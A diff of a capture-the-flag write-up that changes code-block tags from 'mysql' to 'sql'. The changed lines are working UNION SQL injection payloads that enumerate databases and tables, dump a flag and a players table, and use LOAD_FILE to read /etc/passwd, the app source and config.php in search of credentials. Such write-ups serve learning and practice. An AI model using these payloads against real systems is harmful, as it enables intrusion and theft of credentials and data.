@@ -86,7 +86,7 @@ This indeed works out:
 Now that we’ve identified and confirmed the SQLi vulnerability, we can proceed with the standard process of querying the database and enumerating its elements step by step. I’ll cover this part quickly since it’s relatively straightforward. You can reference the SQL UNION Injection Cheat Sheet for additional details: [[Union Injection]]
 
 **Query:**
-```mysql
+```sql
 ' union select group_concat(schema_name) from INFORMATION_SCHEMA.SCHEMATA;-- -
 ```
 **Output:**
@@ -97,7 +97,7 @@ mysql,information_schema,performance_schema,sys,november
 The only non-default database is `november`, let’s explore it:
 
 **Query:**
-```mysql
+```sql
 ' union select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where table_schema='november';-- -
 ```
 **Output:**
@@ -107,7 +107,7 @@ flag,players
 
 Two tables, let’s look at them both:
 **Query:**
-```mysql
+```sql
 ' union select group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where table_schema='flag';-- -
 ```
 **Output:**
@@ -116,7 +116,7 @@ one
 ```
 
 **Query:**
-```mysql
+```sql
 ' union select group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where table_name='players';-- -
 ```
 **Output:**
@@ -127,7 +127,7 @@ player
 Each table has only one column. Don’t be frustrated by it, let’s look at it:
 
 **Query:**
-```mysql
+```sql
 ' union select * from november.players;-- -
 ```
 **Output:**
@@ -136,7 +136,7 @@ ippsec
 ```
 
 **Query:**
-```mysql
+```sql
 ' union select * from november.flag;-- -
 ```
 **Output:**
@@ -153,7 +153,7 @@ After submitting the flag the firewall lets us to connect to `ssh`:
 This is great, now we “only” need valid credentials. We can get the user which runs the DB, this is probably the `ssh` user since the app and the server looks pretty simple:
 
 **Query:**
-```mysql
+```sql
 ' union select user();-- -
 ```
 **Output:**
@@ -164,7 +164,7 @@ uhc@localhost
 Okay, according to our page we can also read local files, let’s try:
 
 **Query:**
-```mysql
+```sql
 ' union select LOAD_FILE("/etc/passwd");-- -
 ```
 Output:
@@ -213,7 +213,7 @@ Now before we switch to some other techniques, we need to exploit this file read
 We need to make guesses where some files could be located, but we can at least make educated guesses. At this stage I really want to find the source files of this app, so the first location I would look for it is `/var/www/html/` and we can look for `challenge.php` :
 
 **Query:**
-```mysql
+```sql
 ' union select LOAD_FILE("/var/www/html/challenge.php");-- -
 ```
 **Output:**
@@ -236,7 +236,7 @@ We need to make guesses where some files could be located, but we can at least m
 Well who could think, we indeed found the location, now let’s try to guess some config files which could store credentials:
 
 **Query:**
-```mysql
+```sql
 ' union select LOAD_FILE("/var/www/html/config.php");-- -
 ```
 **Output:**
